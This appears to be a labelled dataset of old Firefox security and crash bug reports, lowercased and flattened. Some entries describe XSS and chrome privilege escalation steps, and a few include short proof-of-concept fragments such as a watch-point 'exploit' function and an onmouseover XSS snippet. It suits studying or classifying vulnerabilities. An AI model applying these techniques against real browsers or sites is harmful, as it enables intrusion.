nsicontent acontainer int anewindexincontainer 8 gklayout nsdocument contentappended class nsicontent acontainer int anewindexincontainer 8 gklayout nshtmldocument contentappended class nsicontent acontainer int anewindexincontainer 8 gklayout doinsertchildat class nsicontent akid unsigned int aindex 8 int anotify 1 class nsicontent aparent class nsidocument adocument class nsattrandchildarray achildarray gklayout nsgenericelement insertchildat class nsicontent akid unsigned int aindex 8 int anotify 1 gklayout nscontentordocument insertchildat class nsicontent akid unsigned int aindex 8 int anotify 1 class nsattrandchildarray achildarray gklayout nsgenericelement doreplaceorinsertbefore int areplace 0 class nsidomnode anewchild class nsidomnode arefchild class nsicontent aparent class nsidocument adocument class nsattrandchildarray achildarray class nsidomnode areturn gklayout nsgenericelement insertbefore class nsidomnode anewchild class nsidomnode arefchild class nsidomnode areturn gklayout nshtmlheadelement insertbefore class nsidomnode anewchild class nsidomnode arefchild class nsidomnode areturn gklayout nsgenericelement appendchild class nsidomnode anewchild class nsidomnode areturn gklayout nshtmlheadelement appendchild class nsidomnode anewchild class nsidomnode areturn xpcom_core xptc_invokebyindex class nsisupports that unsigned int methodindex unsigned int paramcount 2 struct nsxptcvariant params xpc3250 xpcwrappednative callmethod class xpccallcontext ccx xpcwrappednative callmode mode call_method 0 xpc3250 xpc_wn_callmethod struct jscontext cx struct jsobject obj unsigned int argc 1 long argv long vp js3250 js_invoke struct jscontext cx unsigned int argc 1 unsigned int flags 0 js3250 js_interpret struct jscontext cx unsigned char pc long result js3250 js_invoke struct jscontext cx unsigned int argc 1 unsigned int flags 2 xpc3250 nsxpcwrappedjsclass callmethod class nsxpcwrappedjs wrapper unsigned short methodindex 3 class nsxptmethodinfo info struct nsxptcminivariant nativeparams xpc3250 nsxpcwrappedjs callmethod unsigned short methodindex 3 class nsxptmethodinfo info struct nsxptcminivariant params	11
crash gklayout nstableframe getframeatorbefore i could n't reduce the testcase anymore so i have no idea why this crashes firefox version mozilla/5.0 windows u windows nt 5.1 en-us rv:1.8.1.6 gecko/20070812 bonecho/2.0.0.6 details eax=03de601c ebx=7ffdf000 ecx=03de601c edx=00000000 esi=00a07920 edi=00011970 eip=01b282a0 esp=0012ded8 ebp=0012dee4 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202 warning unable to verify checksum for c mozilla\mozilla\firefox-debug\dist\bin\components\gklayout.dll gklayout nstableframe getframeatorbefore 01b282a0 ff92e8000000 call dword ptr edx+0e8h ds:0023:000000e8 disassembly gklayout nstableframe getframeatorbefore 01b282a0 ff92e8000000 call dword ptr edx+0e8h 01b282a6 394510 cmp dword ptr ebp+10h eax 01b282a9 7505 jne gklayout nstableframe getframeatorbefore 01b282b0 01b282ab 8b450c mov eax dword ptr ebp+0ch 01b282ae eb4e jmp gklayout nstableframe getframeatorbefore 01b282fe 01b282b0 c745f400000000 mov dword ptr ebp-0ch 0 01b282b7 6a00 push 0 01b282b9 8b4508 mov eax dword ptr ebp+8 stack trace gklayout nstableframe getframeatorbefore class nsiframe aparentframe class nsiframe apriorchildframe class nsiatom achildtype gklayout nstablerowframe insertframes class nsiatom alistname class nsiframe aprevframe class nsiframe aframelist gklayout nsframemanager insertframes class nsiframe aparentframe class nsiatom alistname class nsiframe aprevframe class nsiframe aframelist gklayout nscssframeconstructor contentinserted class nsicontent acontainer class nsiframe acontainerframe class nsicontent achild int aindexincontainer 1 class nsilayouthistorystate aframestate int ainreinsertcontent 0 gklayout nscssframeconstructor recreateframesforcontent class nsicontent acontent gklayout nscssframeconstructor processrestyledframes class nsstylechangelist achangelist gklayout nsipresshell reconstructstyledatainternal void gklayout nsipresshell reconstructstyledata void gklayout presshell endupdate class nsidocument adocument unsigned int aupdatetype 2 gklayout nsdocument endupdate unsigned int aupdatetype 2 gklayout nsstylelinkelement updatestylesheet class nsidocument aolddocument class nsicssloaderobserver aobserver gklayout nshtmlstyleelement unbindfromtree int adeep 1 int anullparent 1 gklayout doremovechildat unsigned int aindex 7 int anotify 1 class nsicontent akid class nsicontent aparent class nsidocument adocument class nsattrandchildarray achildarray gklayout nsgenericelement removechildat unsigned int aindex 7 int anotify 1 gklayout nsgenericelement removechild class nsidomnode aoldchild class nsidomnode areturn gklayout nshtmlheadelement removechild class nsidomnode aoldchild class nsidomnode areturn xpcom_core xptc_invokebyindex class nsisupports that unsigned int methodindex unsigned int paramcount 2 struct nsxptcvariant params xpc3250 xpcwrappednative callmethod class xpccallcontext ccx xpcwrappednative callmode mode call_method 0 xpc3250 xpc_wn_callmethod struct jscontext cx struct jsobject obj unsigned int argc 1 long argv long vp js3250 js_invoke struct jscontext cx unsigned int argc 1 unsigned int flags 0	11
crash nsxblprototypebinding attributechanged with domattrmodified xul progressmeter mode loading the testcase makes firefox crash nsxblprototypebinding attributechanged calling a random address often 0 but not always	11
potential read of uninitialized data in cert viewer file mozilla/security/manager/ssl/src/nsnsscerthelper.cpp processgeneralname calls into pr_netaddrtostring twice the return value from pr_netaddrtostring it not being checked even if pr_netaddrtostring fails the code will the contents of buf to a string buf is uninitialized and might not contain zero	11
mousedown event listener changing body style and alert ing crashes presshell handleeventinternal browser user-agent mozilla/5.0 windows u windows nt 5.1 de rv:1.8.1.2 gecko/20070219 firefox/2.0.0.2 build identifier mozilla/5.0 windows u windows nt 5.1 de rv:1.8.1.2 gecko/20070219 firefox/2.0.0.2 prerequisites body has position relative and height:100 a mousedown event listener is added to window which sets body position to static and then displays a message box after closing the message box the browser crashes reproducible always steps to reproduce load the example click anywhere click ok actual results browser crashes expected results browser should n't crash this crash occurs probably due to memory corruption or a freed object being accessed a non existing object s function list is dereferenced and jumped to this ends in various places i m using the following extensions firebug noscript greasemonkey scrapbook web developer and a few others which do n't seem to be relevant here this might be a security problem but i can not make guarantees about that right now about buildconfig build platform target i586-pc-msvc build tools compiler version compiler flags cygwin_wrapper cl 12.00.8804 tc nologo w3 gy fd pdbfile cygwin_wrapper cl 12.00.8804 tp nologo w3 gy fd pdbfile configure arguments enable-application=browser enable-update-channel=release enable-official-branding enable-optimize disable-debug disable-tests enable-static disable-shared enable-svg enable-canvas enable-update-packaging	11
watch point eval-as-setter allows access to dead jsstackframe cat watch-point-dead-stack.txt function exploit var obj this args null obj.__definesetter evil eval obj.watch evil function return args arguments obj.evil null eval print args 0 exploit gdb eval run args dbg.obj/js watch-point-dead-stack.txt program received signal sigsegv segmentation fault in js_getreservedslot cx incomplete type obj index=0 vp at jsapi.c:3971 3971 clasp obj_get_class cx obj	11
drawimage with broken png draws random memory user-agent opera/9.22 x11 linux i686 u en build identifier with a broken png file which causes the image can not be displayed because it contains errors when opened in the browser normally calling drawimage results in random stuff being drawn onto the canvas each time the page is reloaded reproduced with mozilla/5.0 windows u windows nt 5.2 en-gb rv:1.8.1.6 gecko/20070725 firefox/2.0.0.6 mozilla/5.0 x11 u linux i686 en-gb rv:1.8.1.5 gecko/20070713 firefox/2.0.0.5 mozilla/5.0 x11 u linux i686 en-us rv:1.9a8pre gecko/2007080504 minefield/3.0a8pre could n't reproduce in mozilla/5.0 windows u windows nt 5.2 en-us rv:1.9a8pre gecko/2007080505 minefield/3.0a8pre it only ever gave a black rectangle html 5 says at complete that img.complete should be false if the image was n't valid and drawimage says that should cause invalid_state_err in drawimage reproducible always	11
crash with large switch statement js_interpret mozilla/5.0 windows u windows nt 5.2 en-us rv:1.9a9pre gecko/2007092705 minefield/3.0a9pre id:2007092705 and latest 1.8 nightly crash when is loaded stack of crashing thread frame signature source 0 js_interpret mozilla/js/src/jsinterp.c:4515 1 js_execute mozilla/js/src/jsinterp.c:1622 2 js_evaluateucscriptforprincipals mozilla/js/src/jsapi.c:4878 3 nsjscontext evaluatestring nsastring_internal const void nsiprincipal char const unsigned int unsigned int nsastring_internal int mozilla/dom/src/base/nsjsenvironment.cpp:1389 4 nsscriptloader evaluatescript nsscriptloadrequest nsstring const mozilla/content/base/src/nsscriptloader.cpp:607 5 nsscriptloader processrequest nsscriptloadrequest mozilla/content/base/src/nsscriptloader.cpp:521 6 nsscriptloader processscriptelement nsiscriptelement mozilla/content/base/src/nsscriptloader.cpp:486 7 nsscriptelement maybeprocessscript mozilla/content/base/src/nsscriptelement.cpp:188 8 nshtmlscriptelement maybeprocessscript mozilla/content/html/content/src/nshtmlscriptelement.cpp:536 9 nshtmlscriptelement doneaddingchildren int mozilla/content/html/content/src/nshtmlscriptelement.cpp:482 10 htmlcontentsink processscriptendtag nsgenerichtmlelement int mozilla/content/html/document/src/nshtmlcontentsink.cpp:3141 11 sinkcontext closecontainer nshtmltag int mozilla/content/html/document/src/nshtmlcontentsink.cpp:1008 12 htmlcontentsink closecontainer nshtmltag mozilla/content/html/document/src/nshtmlcontentsink.cpp:2406 13 cnavdtd closecontainer nshtmltag int mozilla/parser/htmlparser/src/cnavdtd.cpp:2686 14 cnavdtd handleendtoken ctoken mozilla/parser/htmlparser/src/cnavdtd.cpp:1590 15 cnavdtd handletoken ctoken nsiparser mozilla/parser/htmlparser/src/cnavdtd.cpp:705 16 cnavdtd buildmodel nsiparser nsitokenizer nsitokenobserver nsicontentsink mozilla/parser/htmlparser/src/cnavdtd.cpp:331 17 nsparser buildmodel mozilla/parser/htmlparser/src/nsparser.cpp:1717 18 nsparser resumeparse int int int mozilla/parser/htmlparser/src/nsparser.cpp:1594 19 nsparser continueinterruptedparsing mozilla/parser/htmlparser/src/nsparser.cpp:1118 20 nscontentsink continueinterruptedparsingifenabled mozilla/content/base/src/nscontentsink.cpp:1494 21 nsrunnablemethod nscontentsink run nsthreadutils.h:261 22 nsthread processnextevent int int mozilla/xpcom/threads/nsthread.cpp:490 23 ns_processnextevent_p nsithread int nsthreadutils.cpp:227 24 nsbaseappshell run mozilla/widget/src/xpwidgets/nsbaseappshell.cpp:154 25 nsappstartup run mozilla/toolkit/components/startup/src/nsappstartup.cpp:170 26 xre_main mozilla/toolkit/xre/nsapprunner.cpp:3114 27 main mozilla/browser/app/nsbrowserapp.cpp:153 28 winmain mozilla/browser/app/nsbrowserapp.cpp:166 29 tmaincrtstartup crtexe.c:589 30 kernel32.dll	11
setting gc-zeal before js_compilescript causes null-deref obj map in jsop_deffun user-agent mozilla/5.0 windows u windows nt 5.1 fr rv:1.8.1.8 gecko/20071008 firefox/2.0.0.8 build identifier spidermonkey post 1.8 cvs-most-recent on friday oct 26 2007 if i set gc-zeal in my embedding before calling js_compilescript many strange things happen sometimes things will work perfectly other times i will get nonsensical assertions in js_executescript lose my c debugging symbols while walking through the code with gdb etc if i unset gc-zeal or use the debugger to not allow js_gc to run the program behaves as expected the good news is the behaviour is quite deterministic a particular embedding/js-code combination tends to yield the same behaviour consistently i have reduced the input javascript and c embedding to the smallest forms nearly trivial which demonstrates this bug reliably on my platform solaris 10 zone dual ultrasparc-ii cpus in a zone distro gcc 3.4.3 i have not been able to replicate this bug my modifying jc.c or using js_evaluatescript i have been able to replicate it using js_compilefilehandle i always use gczeal 2 reproducible always steps to reproduce 1 compile latest and greatest cvs spidermonkey 2 compile the attached program 3 observe that it throws a non-sensical assertion actual results assertion failure obj_get_class cx obj js_functionclass at jsinterp.c:4878 expected results exec ok\n on stdout gnu gdb 6.6 copyright c 2006 free software foundation inc gdb is free software covered by the gnu general public license and you are welcome to change it and/or distribute copies of it under certain conditions type show copying to see the conditions there is absolutely no warranty for gdb type show warranty for details this gdb was configured as sparc-sun-solaris2.10 gdb run starting program export/home/wes/cvs/surelynx/src/jseng/go2 warning temporarily disabling breakpoints for unloaded shared library usr/lib/ld.so.1 warning lowest section in usr/lib/libpthread.so.1 is dynamic at 00000074 warning lowest section in usr/lib/libthread.so.1 is dynamic at 00000074 warning lowest section in usr/lib/libdl.so.1 is dynamic at 00000094 assertion failure obj_get_class cx obj js_functionclass at jsinterp.c:4878 program received signal sigabrt aborted in lwp_kill from usr/lib/libc.so.1 gdb bt 0 in lwp_kill from usr/lib/libc.so.1 1 in raise from usr/lib/libc.so.1 2 in abort from usr/lib/libc.so.1 3 in js_assert s obj_get_class cx obj js_functionclass file jsinterp.c ln=4878 at jsutil.c:63 4 in js_interpret cx pc result at jsinterp.c:4878 5 in js_execute cx chain script down flags=0 result at jsinterp.c:1633 6 in js_executescript cx obj script rval at jsapi.c:4714 7 in main argc=1 argv at go2.c:37 gdb	11
putimagedata draws random memory user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.8.1.11pre gecko/20071127 bonecho/2.0.0.11pre build identifier mozilla/5.0 x11 u linux i686 en-us rv:1.8.1.11pre gecko/20071127 bonecho/2.0.0.11pre in ff2 on linux some uses of putimagedata e.g ctx.putimagedata ctx.getimagedata 0 0 128 64 0 128 on a 256x256 canvas fill the destination with bits of memory instead of with the correct pattern the soon-to-be-attached test case works for me in trunk builds on linux i have n't tested any other platform reproducible always	11
jsop_closure unconditionally replaces properties of the variable object currently jsop_closure unconditionally calls obj_define_property on the variable object without checking that the property is not readonly or dontdelete it allows to replace const properties of the global object the attached example shows that altering window.document compare that with jsop_deffun case which since landing the bug 21618 explicitly prevents such overwrites	11
js_findclassobject causes crashes with getter/setter 2780 a found property can be a getter/setter in which case sprop slot is	11
xss by using javascript url when javascript url is evaluated in the sandbox and its resulting value is an object the object s tostring and valueof methods defined by sandboxed script can be called on the web page s context this is exploitable by using array.prototype methods trick bug 344495 the trunk fx2.0.0.1 and fx1.5.0.9 are affected	9
javascript uri evaluation should use sandboxed context for tostring etc see bug 368763 comment 9 basically if someone manages to run an unprivileged javascript uri against a privileged iframe they can possibly escalate their privileges i bet moz_bug_r_a4 yahoo.com can provide an exploit if people need convincing we should probably either duplicate the context-creation stuff in xpconnect or somehow expose it	9
pac privilege escalation using exception objects came from outside of sandbox when findproxyforurl is being called exception objects are created in a context that is trying to load a url function findproxyforurl url host try new xpcnativewrapper or components.lookupmethod etc catch e x e x is an exception object came from a web page chrome browser.xul or the safe context hidden window an object that has the system principal or the hidden window s principal can be used to defeat the xpcsafejsobjectwrapper in proxyalert and dnsresolve actual exploit code relies on other security bugs	9
xss and arbitrary code execution by using xmldocument.load and event handler this is related to bug 382636 and bug 325818 xss 1 create an xml document d with a subframe s context and attach an onload event handler to d 2 load a target site in the subframe 3 call d.load the onload event handler is called with the target site s principal arbitrary code execution 1 create an xml document d by using xmldocument.clonenode and attach an onload event handler to d 2 call d.load the onload event handler is called with the hidden window s principal since the hidden window s principal is allowed to load chrome urls it s possible to run arbitrary code with chrome privileges by using an xss attack	9
arbitrary code execution using an event handler attached to an element whose owner document has no script global object please see bug 383424 a document created by domimplementation.createdocument does not have a script global object with such a document nscxpusher push does not push a js context and it s possible to change the owner document of an element by using adoptnode or appendchild on 1.8/1.8.0 branches	9
bypassing xpcnativewrapper by redefining xpcnativewrapper when creating an xpcnativewrapper object we get the prototype object for it from content global scope but content can override the prototype object by redefining xpcnativewrapper xpcnativewrapper function xpcnativewrapper.prototype x	9
xpcnativewrapper calls untrusted functions during construction the fix for bug 399298 can be circumvented since a getter for prototype can be called in js_getclassprototype	9
avoid xss with incomplete sequences in multibyte character sets yosuke hasegawa at webappsec.jp reported a bug in the mozilla parser through jpcert/cc the parser ignores control character in html tag attributes if character encoding of the page is shift_jis commonly used in japan and allows cross-site scripting attacks in some cases scripts can not be run if the charset is not shift_jis he posted the poc here it contains the following codes div onmouseover alert xss aaa div s c r i p t document.write xss script	9
potential xss vulnerability because of u+0008 being treated as whitespace user-agent mozilla/5.0 macintosh u intel mac os x en applewebkit/525.1 khtml like gecko safari/419.3 build identifier mozilla/5.0 macintosh u intel mac os x ru rv:1.8.1.9 gecko/20071025 firefox/2.0.0.9 while investigating how bug 381412 affects webkit i ve noticed a similar issue in firefox because of u+0008 being treated as whitespace it is possible to disguise dangerous attributes and possibly elements as unknown ones msie and html5 spec agree that u+0008 is not whitespace webkit had problems that i ve just fixed but i do n't know when this fix will be released by apple reproducible always steps to reproduce open the attached test case line with 08 should be green ideally all lines should be green but the other two firefox failures are in other direction characters that should be whitespace are n't so they can not be used for such an exploit	9
garbled japanese after bug 381412 xss variant still possible this bug covers regressions from bug 381412 where japanese thunderbird users are suffering from garbled subject lines bug 381412 comment 18 there is also still an xss variant still present bug 381412 comment 19 that i m unsure is best handled as part of fixing real-world japanese mail subjects this regression or in a separate bug it sounds like bug 381412 comment 32 that it should be a separate bug sorry to duplicate so many comments but the bug-morph was making it hard to track what was and was not fixed by the other bug comment 19 masatoshi kimura emk 2007-11-17 11:58:12 pst created an attachment id=289166 details thunderbird 2.0.0.9 counld n't decode the subject at all why iso-2022-jp decoder fails if it encounters a empty sequence some japanese mail subjects are completely garbled even if the empty sequence is at end of the subject other encoders seem to fallback to u+fffd why only the japanese encoder fails comment 19 reply masatoshi kimura emk 2007-11-17 11:59:06 pst created an attachment id=289167 details testcase using esc j moreover the fix is incomplete i could cause xss attack against firefox 2.0.0.9 using empty sequences comment 20 reply masatoshi kimura emk 2007-11-17 12:00:52 pst created an attachment id=289168 details patch this will fix both problems comment 26 reply simon montagu 2007-11-28 13:09:56 pst from update of attachment 290136 details diff review else if j src mstate mstate_jisx0201_1976roman if mrunlength 0 if dest+1 destend goto error1 dest this is going to put in u+fffd whenever we shift from ascii to jis-x roman no that seems wrong to me maybe the condition should be if mrunlength 0 mlastlegalstate mstate_ascii else xxx we need to decide how to handle and here we may need a if statement here for and to map them to yen and overbar dest prunichar src mrunlength and removing this line is going to cause u+fffd whenever we shift back from jis-x roman to ascii comment 27 reply kohei yoshino 2007-11-28 21:05:58 pst some thunderbird users including myself have confirmed the garbled message subjects since 2.0.0.9 comment 28 reply masatoshi kimura emk 2007-11-29 04:38:46 pst in reply to comment 26 from update of attachment 290136 details diff review details this is going to put in u+fffd whenever we shift from ascii to jis-x roman no that seems wrong to me maybe the condition should be if mrunlength 0 mlastlegalstate mstate_ascii i know it s technically wrong but we have no choice to avoid xss with sequnces such as esc j script and removing this line is going to cause u+fffd whenever we shift back from jis-x roman to ascii ditto it s required to avoid xss with sequences such as esc j esc b script and of course we need to avoid jis-x roman to jis-x roman sequences do you have a good idea to prevent these attacks comment 31 reply masatoshi kimura emk 2007-12-04 03:11:03 pst created an attachment id=291406 details resolved review comment i removed a testcase because this version will fail the test comment 32 reply masatoshi kimura emk 2007-12-04 03:13:19 pst created an attachment id=291407 details new manual testcase new patch is vulnerable to this test i ll file a followup bug about this problem when this bug is resolved again comment 33 reply simon montagu 2007-12-04 13:34:46 pst i m sorry i need more time to think about the right thing to do here we should certainly fix the thunderbird regression but i m not sure what to about the vulnerabilities with ascii to jis-x roman sequences unlike the sequences that my original patch was designed to prevent these sequences are completely legal iso-2022-jp comment 34 reply masatoshi kimura emk 2007-12-05 04:31:42 pst in reply to comment 33 your patch refuses ascii to ascii sequences that are also completely valid per bnf defined in rfc 1468 there is no point to allow switching between jis roman and ascii btw my new patch will fix only the thunderbird regression which is urgent for japanese users so i proposed filing a new bug to consider about remaining problem another btw bug 406777 may become a solution comment 35 reply simon montagu 2007-12-05 12:10:25 pst from update of attachment 291406 details diff review ok that s fair enough r=smontagu	9
arbitrary code execution by polluting implicit xpcnativewrapper without using eval please see bug 369211 content can access implicit xpcnativewrappers without using eval by abusing tabbrowser.xml s contentwindow and contentdocument getter functions	9
the fix for bug 384750 can be circumvented it s possible to call define gs etter on an implicit xpcnativewrapper in a chrome xbl method	9
xpcnativewrapper pollution using settimeout a script that settimeout code creates inherits its scripted caller s script filename thus it s possible to use settimeout in the same way as bug 369211 and bug 387881 to modify xpcnativewrappers	9
xpcnativewrapper pollution using function constructor a function that function constructor creates inherits its scripted caller s script filename thus it s possible to use function constructor in the same way as bug 369211 and bug 387881 to modify xpcnativewrappers	9
xss by using xmldocument.load and event handler the fix in bug 393762 stops the testcases in bug 393761 both xss and privilege escalation but with that fix it s still possible to perform xss attacks 1 create an xml document d whose script handling object is a subframe s global object and attach an onload event handler to d 2 load a target site in the subframe 3 call d.load the onload event handler is called with the target site s principal	9
xss by using xmlhttprequest and event handler 1 create an xmlhttprequest r with a subframe s context and attach an event handler to r 2 load a target site in the subframe 3 call r.send the event handler is called with the target site s principal	9
indirect use of eval can run code with the wrong principal pad	2
overlay scripts compiled using principal of first document sourcing overlay this is spun off of bug 378377 comment 11 since that bug is really about something else and this is getting lost in the information about the problems alex is seeing in brief we have a non-chrome not loaded from a chrome uri does n't have system principal xul document loading an overlay from a chrome uri this is explicitly allowed by 2693 the overlay has a xul script in it we compile this script with the principal of the main document 2996 now the script has an nsprincipal as the principal but the uri of the overlay is a chrome uri so when we get into nsxuldocument endload we go ahead and write the overlay to the fastload file 538 miswritingfastload is true any time the xul cache is enabled dunno why this code is checking both that and usexulcache so we try to serialize the script and its principal into the fastload file then the next time around we just fastload the overlay including the nsprincipal and hit the breakage in nsprincipal read note also that even if we did n't just creating two principals from the same data does n't mean they re equal so fastloading the principal of the script here is wrong anyway but the part that worries me is the following say a chrome document loads a chrome overlay then a non-chrome xul document loads the same chrome overlay the overlay will be fastloaded including the script the script object will be given the system principal then we will execute this script against the non-chrome document s global object using js_executescript what i want to know is how the principal the script was compiled with is used in this case does the script end up executing with that principal against the untrusted global if so i think we should fix things so that does n't happen if nothing else because the script will define scripted system-principal functions on said global replicating the blocking flags that bug got based on this information benjamin says in bug 378377 comment 13 we should disable fastload for non-chrome main documents altogether is that easy and i reply in bug 378377 comment 14 actually we also need to disable the prototype cache for non-chrome main documents how do we define chrome here btw uri or principal or both since it s the prototype instantiation that s a problem here that seems a little more complicated at least with my low knowledge of the code	2
security check in js_valuetofunctionobject uses the wrong principal 2127 the security check in js_valuetofunctionobject uses the wrong principal when caller is a cloned function thus it s possible to abuse a privileged function by using object.prototype.watch or array looping method e.g foreach to run arbitrary code with chrome privileges	2
firefox argb32_image_argb32 gif file processing dos user-agent mozilla/5.0 macintosh u ppc mac os x mach-o en-us rv:1.9a1 gecko/20060221 firefox/1.6a1 build identifier mozilla/5.0 macintosh u ppc mac os x mach-o en-us rv:1.9a1 gecko/20060221 firefox/1.6a1 a file processing vulnerability exists within firefox and deer park alpha 2 which allows for an attacker to cause the browser to crash and or execute arbitrary code on a targeted host the vulnerability is caused due to a boundary error within the “ argb32_image_argb32 function when processing a malformed gif file below is output from gdb on os x 10.4.5 ppc with deerpark2 build 2006022104 program received signal exc_bad_access could not access memory reason kern_invalid_address at address in argb32_image_argb32 versions tested firefox 1.5.0.1 on os x 10.4.5 ppc deer park alpha 2 build 2006022104 talkback incident tb15506379q please let me know if you need any other information thanks tom ferris researcher www.security-protocols.com key fingerprint 0dfa 6275 ba05 0380 dd91 34ad c909 a338 d1af 5d78 reproducible always steps to reproduce	11
crash removing an observer during an nspref changed notification pref_docallback node is crash in pref_docallback node is when i use about config to change the hidden browser.tabs.closebuttons pref this happend to me on the trunk a couple times but it s not always reproducable to reproduce 1 i had multiple windows with mutliple tabs per window 2 about config in one 3 create new integer pref hidden browser.tabs.closebuttons 4 set to 1 sometimes boom other times when i went to change the pref from 1 to 0 or 0 to 1 boom but not always node points to freed memory node domain func data callbacknode here s the stack xppref32.dll pref_docallback const char changed_pref line 875 bytes c xppref32.dll pref_hashpref const char key prefvalue value preftype type=pref_int int set_default=0 line 770 bytes c xppref32.dll pref_setintpref const char pref_name int value=0 int set_default=0 line 299 bytes c xppref32.dll nsprefbranch setintpref const char aprefname int avalue=0 line 223 bytes c xpcom_core.dll xptc_invokebyindex nsisupports that unsigned int methodindex=2 unsigned int paramcount=1235872 nsxptcvariant params line 102 c xpc3250.dll xpcwrappednative callmethod xpccallcontext ccx xpcwrappednative callmode mode=10 line 2162 bytes c xpc3250.dll xpcwrappednative callmethod xpccallcontext ccx xpcwrappednative callmode mode=call_method line 2162 bytes c xpc3250.dll xpc_wn_callmethod jscontext cx jsobject obj unsigned int argc=2 long argv long vp line 1450 bytes c js3250.dll js_invoke jscontext cx unsigned int argc=2 unsigned int flags=0 line 1349 bytes c js3250.dll js_interpret jscontext cx unsigned char pc long result line 4084 bytes c js3250.dll js_invoke jscontext cx unsigned int argc=1 unsigned int flags=2 line 1368 bytes c js3250.dll js_internalinvoke jscontext cx jsobject obj long fval=132230008 unsigned int flags=0 unsigned int argc=1 long argv long rval line 1447 bytes c js3250.dll js_callfunctionvalue jscontext cx jsobject obj long fval=132230008 unsigned int argc=1 long argv long rval line 4385 bytes c gklayout.dll nsjscontext calleventhandler nsisupports atarget void ascope void ahandler nsiarray aargv nsivariant arv line 1731 bytes c gklayout.dll nsjseventlistener handleevent nsidomevent aevent line 209 bytes c gklayout.dll nseventlistenermanager handleeventsubtype nslistenerstruct alistenerstruct nsidomeventlistener alistener nsidomevent adomevent nsisupports acurrenttarget unsigned int asubtype=8 unsigned int aphaseflags=6 line 1648 bytes c gklayout.dll nseventlistenermanager handleevent nsprescontext aprescontext nsevent aevent nsidomevent adomevent nsisupports acurrenttarget unsigned int aflags=6 nseventstatus aeventstatus line 1752 c gklayout.dll nseventtargetchainitem handleevent nseventchainpostvisitor avisitor unsigned int aflags=6 line 356 c gklayout.dll nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor avisitor unsigned int aflags=6 nsdispatchingcallback acallback line 433 c gklayout.dll nseventdispatcher dispatch nsisupports atarget nsprescontext aprescontext nsevent aevent nsidomevent adomevent nseventstatus aeventstatus nsdispatchingcallback acallback int atargetischromehandler=0 line 639 bytes c gklayout.dll presshell handledomeventwithtarget nsicontent atargetcontent nsevent aevent nseventstatus astatus line 6321 bytes c gklayout.dll nsmenuframe execute nsguievent aevent line 1659 c gklayout.dll nsmenuframe handleevent nsprescontext aprescontext nsguievent aevent nseventstatus aeventstatus line 451 bytes c gklayout.dll nspresshelleventcb handleevent nseventchainpostvisitor avisitor line 1498 c gklayout.dll nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor avisitor unsigned int aflags=6 nsdispatchingcallback acallback line 481 c gklayout.dll nseventdispatcher dispatch nsisupports atarget nsprescontext aprescontext nsevent aevent nsidomevent adomevent nseventstatus aeventstatus nsdispatchingcallback acallback int atargetischromehandler=0 line 639 bytes c gklayout.dll presshell handleeventinternal nsevent aevent nsiview aview nseventstatus astatus line 6278 bytes c gklayout.dll presshell handlepositionedevent nsiview aview nsiframe atargetframe nsguievent aevent nseventstatus aeventstatus line 6153 bytes c gklayout.dll presshell handleevent nsiview aview nsguievent aevent nseventstatus aeventstatus line 5981 bytes c gklayout.dll nsviewmanager handleevent nsview aview nspoint apoint nsguievent aevent int acaptured=0 line 1665 c gklayout.dll nsviewmanager dispatchevent nsguievent aevent nseventstatus astatus line 1618 bytes c gklayout.dll handleevent nsguievent aevent line 174 c gkwidget.dll nswindow dispatchevent nsguievent event nseventstatus astatus=nseventstatus_eignore line 1102 bytes c gkwidget.dll nswindow dispatchwindowevent nsguievent event line 1123 c gkwidget.dll nswindow dispatchmouseevent unsigned int aeventtype=301 unsigned int wparam=0 long lparam=3014724 line 6033 bytes c gkwidget.dll childwindow dispatchmouseevent unsigned int aeventtype=301 unsigned int wparam=0 long lparam=3014724 line 6216 c gkwidget.dll nswindow processmessage unsigned int msg=514 unsigned int wparam=0 long lparam=3014724 long aretvalue line 4548 bytes c gkwidget.dll nswindow windowproc hwnd hwnd unsigned int msg=514 unsigned int wparam=0 long lparam=3014724 line 1291 bytes c user32.dll 77d48734 frames below may be incorrect and/or missing no symbols loaded for user32.dll user32.dll 77d48816 user32.dll 77d489cd user32.dll 77d49402 user32.dll 77d48a10 gkwidget.dll nsappshell processnextnativeevent int maywait=1 line 149 c gkwidget.dll nsbaseappshell doprocessnextnativeevent int maywait=1 line 136 bytes c gkwidget.dll nsbaseappshell onprocessnextevent nsithreadinternal thr int maywait=1 unsigned int recursiondepth=0 line 231 bytes c xpcom_core.dll nsthread processnextevent int maywait=1 int result line 472 c xpcom_core.dll ns_processnextevent_p nsithread thread int maywait=1 line 225 bytes c gkwidget.dll nsbaseappshell run line 153 bytes c tkitcmps.dll nsappstartup run line 171 bytes c xul.dll xre_main int argc=1 char argv const nsxreappdata aappdata line 2387 bytes c firefox.exe main int argc=1 char argv line 61 bytes c firefox.exe tmaincrtstartup line 586 bytes c firefox.exe maincrtstartup line 403 c kernel32.dll 7c816d4f kernel32.dll 7c8399f3	11
1.8 branch crash documentviewerimpl destroy with popup as root element setting autoposition and reloading see testcase which crashes mozilla after 300ms because it then reloads 0 nsstylecounterdata vector deleting destructor unsigned int 1 nsstylecontent nsstylecontent 2 nsstylecontent destroy nsprescontext 3 nsresetstyledata destroy unsigned int nsprescontext 4 nscachedstyledata destroy unsigned int nsprescontext 5 nsrulenode nsrulenode 6 nsrulenode destroy 7 nsstyleset shutdown nsprescontext 8 presshell destroy 9 documentviewerimpl destroy it also crashes branch builds so i m marking it security sensitive for now i guess this might depend on bug 279703	11
port fix for mac large image crasher to 1.8 branch images with heights larger than 32k cause a crash within quartz drawing code on the mac the bug has been reported to apple but in the meantime we need to restrict our code to avoid loading images over 32k in height see bug 328258 for testcase and details	11
midas crashes getnearestcapturingview when iframe style is changed during editing user-agent mozilla/5.0 windows u windows nt 5.1 de rv:1.8.1.10 gecko/20071115 firefox/2.0.0.10 build identifier mozilla/5.0 windows u windows nt 5.1 de rv:1.8.1.10 gecko/20071115 firefox/2.0.0.10 an iframe s document has an event handler attached that changes the iframe s position style to relative when the user tries to select some text with the mouse when midas designmode on is enabled on that iframe the browser crashes reproducible always steps to reproduce select some text actual results firefox crashes expected results firefox should n't crash on bug 373344 i was told the following after posting the test case because i thought it belongs there due to its similarity does n't seem to crash on trunk and on branch the stack trace looks quite different to this bug but the trace does look familiar could you perhaps file a new security sensitive bug and attach the testcase there	11
